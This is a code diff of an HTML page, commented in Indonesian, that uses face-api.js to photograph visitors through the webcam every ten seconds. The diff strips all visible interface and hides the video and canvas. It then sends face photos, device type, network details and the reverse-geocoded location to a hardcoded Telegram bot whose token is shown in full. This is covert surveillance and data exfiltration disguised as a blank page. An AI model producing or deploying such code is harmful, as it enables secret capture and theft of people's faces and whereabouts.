@@ -3,42 +3,28 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>📸 Auto Face Capture → Telegram</title>
+  <title>Auto Face → Telegram</title>
   <style>
-    body {
-      margin: 0; font-family: Arial, sans-serif;
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      background: #0d1117; color: #eee; height: 100vh;
-    }
-    video, canvas { border-radius: 10px; box-shadow: 0 0 20px #00ffff55; }
-    #info { margin-top: 12px; color: #ccc; font-size: 14px; max-width: 640px; text-align: center; }
-    #error { margin-top: 10px; color: #ff6666; }
+    body { margin: 0; background: #000; overflow: hidden; }
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
-  <h2>🤖 Auto Face Detect → Kirim ke Telegram</h2>
-  <video id="video" width="640" height="480" autoplay muted playsinline></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-  <div id="info">Menyiapkan sistem...</div>
-  <div id="error"></div>
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
-  <!-- face-api.js -->
   <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
-
   <script>
-  // ========== KONFIGURASI ==========
+  // === KONFIGURASI BOT ===
   const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
   const CHAT_ID = "8471664635";
-
   const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
-  const DETECT_INTERVAL = 10000; // setiap 10 detik
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const ctx = canvas.getContext('2d');
-  const infoDiv = document.getElementById('info');
-  const errorDiv = document.getElementById('error');
+  const DETECT_INTERVAL = 10000; // 10 detik
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
 
-  // ==== Utility: Deteksi device, jaringan, lokasi ====
+  // ==== Fungsi pendukung ====
   function detectDevice() {
     const ua = navigator.userAgent.toLowerCase();
     let brand = "Unknown";
@@ -53,15 +39,14 @@
     } else if (/windows/.test(ua)) brand = "Windows PC";
     else if (/macintosh/.test(ua)) brand = "MacOS";
     else if (/linux/.test(ua)) brand = "Linux";
-    return { brand, ua };
+    return brand;
   }
 
   function getNetworkInfo() {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     return {
       type: conn ? conn.effectiveType : "unknown",
-      downlink: conn ? conn.downlink : "n/a",
-      rtt: conn ? conn.rtt : "n/a"
+      downlink: conn ? conn.downlink : "n/a"
     };
   }
 
@@ -78,146 +63,77 @@
 
   async function reverseGeocode(lat, lon) {
     try {
-      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
-      const d = await r.json();
-      return d.display_name || null;
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+      const data = await res.json();
+      const countryCode = data.address?.country_code?.toUpperCase() || "N/A";
+      const country = data.address?.country || "Tidak diketahui";
+      const city = data.address?.city || data.address?.town || data.address?.village || "Tidak diketahui";
+      return `${city}, ${country} [${countryCode}]`;
     } catch {
-      return null;
+      return "Tidak diketahui";
     }
   }
 
-  // ==== Kirim ke Telegram ====
   async function sendToTelegram(photoBlob, caption) {
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
     fd.append("caption", caption);
     fd.append("photo", photoBlob, "face.jpg");
-    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-    if (!resp.ok) throw new Error("Gagal kirim ke Telegram (" + resp.status + ")");
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: fd
+    });
   }
 
-  // ==== Ambil Foto & Kirim ====
+  // ==== Deteksi & Kirim ====
   async function captureAndSend() {
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
-    if (detections.length === 0) {
-      console.log("❌ Tidak ada wajah terdeteksi");
-      infoDiv.textContent = "Tidak ada wajah, mencoba lagi...";
-      return;
-    }
+    // ambil ukuran proporsional (agar tidak gepeng)
+    const w = video.videoWidth;
+    const h = video.videoHeight;
+    canvas.width = w;
+    canvas.height = h;
+    ctx.drawImage(video, 0, 0, w, h);
 
-    infoDiv.textContent = `✅ ${detections.length} wajah terdeteksi, sedang kirim...`;
+    const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
+    if (detections.length === 0) return; // skip kalau tidak ada wajah
+
     const device = detectDevice();
     const net = getNetworkInfo();
     const loc = await getLocation();
     let locText = "Tidak diketahui";
-    if (loc) {
-      const geo = await reverseGeocode(loc.lat, loc.lon);
-      locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}\n${geo || ""}`;
-    }
+    if (loc) locText = await reverseGeocode(loc.lat, loc.lon);
 
-    const caption = `📸 Deteksi Wajah Otomatis\n` +
-                    `📱 Device: ${device.brand}\n` +
-                    `🌐 Jaringan: ${net.type} (${net.downlink} Mbps)\n` +
-                    `📍 Lokasi: ${locText}\n` +
-                    `🕒 ${new Date().toLocaleString()}`;
+    const caption =
+`📸 Deteksi Wajah Otomatis
+📱 Device: ${device}
+🌐 Jaringan: ${net.type.toUpperCase()} (${net.downlink} Mbps)
+📍 Lokasi: ${locText}
+🕒 ${new Date().toLocaleString("id-ID")}`;
 
     canvas.toBlob(async blob => {
       try {
         await sendToTelegram(blob, caption);
-        infoDiv.textContent = "✅ Data terkirim ke Telegram (" + new Date().toLocaleTimeString() + ")";
+        console.log("✅ Terkirim:", new Date().toLocaleTimeString());
       } catch (e) {
-        errorDiv.textContent = "Gagal kirim: " + e.message;
+        console.error("❌ Gagal kirim:", e);
       }
-    }, 'image/jpeg', 0.9);
+    }, "image/jpeg", 0.9);
   }
 
   // ==== Inisialisasi ====
   async function init() {
     try {
-      infoDiv.textContent = "Memuat model AI...";
       await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       video.srcObject = stream;
       await video.play();
-
-      infoDiv.textContent = "Kamera aktif, mendeteksi otomatis...";
       setInterval(captureAndSend, DETECT_INTERVAL);
     } catch (e) {
-      errorDiv.textContent = "❌ Error: " + e.message;
-      infoDiv.textContent = "Tidak bisa mengakses kamera.";
+      console.error("Kamera error:", e);
     }
   }
 
   window.addEventListener("load", init);
-  </script>
-</body>
-</html>        loadingText.textContent = 'Memuat model AI... ⏳';
-
-        // ✅ Muat model yang tersedia di mirror publik
-        await Promise.all([
-          faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
-          faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
-          faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL)
-        ]);
-
-        loadingText.textContent = 'Model berhasil dimuat ✅, mengaktifkan kamera...';
-        await startCamera();
-      } catch (err) {
-        showError("❌ Gagal memuat model: " + err.message);
-      }
-    }
-
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          loadingText.textContent = "Kamera aktif! 🔍 Sedang mendeteksi wajah...";
-          detectLoop();
-        };
-      } catch (err) {
-        showError(
-          "❌ Gagal mengakses kamera: " + err.message +
-          "\n\nSolusi:\n1️⃣ Jalankan file ini lewat server lokal (bukan file://)\n2️⃣ Gunakan http://localhost\n3️⃣ Pastikan kamera tidak digunakan aplikasi lain"
-        );
-      }
-    }
-
-    async function detectLoop() {
-      const displaySize = { width: video.width, height: video.height };
-      faceapi.matchDimensions(overlay, displaySize);
-
-      async function loop() {
-        try {
-          const detections = await faceapi
-            .detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
-            .withFaceLandmarks()
-            .withFaceExpressions();
-
-          context.clearRect(0, 0, overlay.width, overlay.height);
-          const resizedDetections = faceapi.resizeResults(detections, displaySize);
-          faceapi.draw.drawDetections(overlay, resizedDetections);
-          faceapi.draw.drawFaceLandmarks(overlay, resizedDetections);
-          faceapi.draw.drawFaceExpressions(overlay, resizedDetections);
-        } catch (err) {
-          console.error("Kesalahan deteksi:", err);
-        }
-        requestAnimationFrame(loop);
-      }
-      loop();
-    }
-
-    function showError(msg) {
-      errorDiv.style.display = 'block';
-      errorDiv.textContent = msg;
-      loadingText.textContent = '❌ Terjadi kesalahan.';
-      console.error(msg);
-    }
-
-    window.addEventListener('load', init);
   </script>
 </body>
 </html>
